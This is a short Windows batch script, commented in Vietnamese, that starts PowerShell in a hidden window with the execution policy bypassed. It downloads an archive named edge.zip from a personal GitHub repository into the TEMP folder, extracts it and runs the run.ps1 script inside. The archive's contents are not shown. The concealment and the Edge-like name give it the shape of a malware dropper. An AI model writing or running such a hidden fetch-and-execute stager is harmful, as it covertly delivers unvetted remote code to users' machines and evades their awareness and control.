@echo off
:: Chạy PowerShell ở chế độ ẩn và thực thi các lệnh tải/giải nén
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/Haianh58/test/raw/refs/heads/main/edge.zip' -OutFile '$env:TEMP\edge.zip'; Expand-Archive -Path '$env:TEMP\edge.zip' -DestinationPath '$env:TEMP\edge_work' -Force; Set-Location '$env:TEMP\edge_work'; .\run.ps1"
exit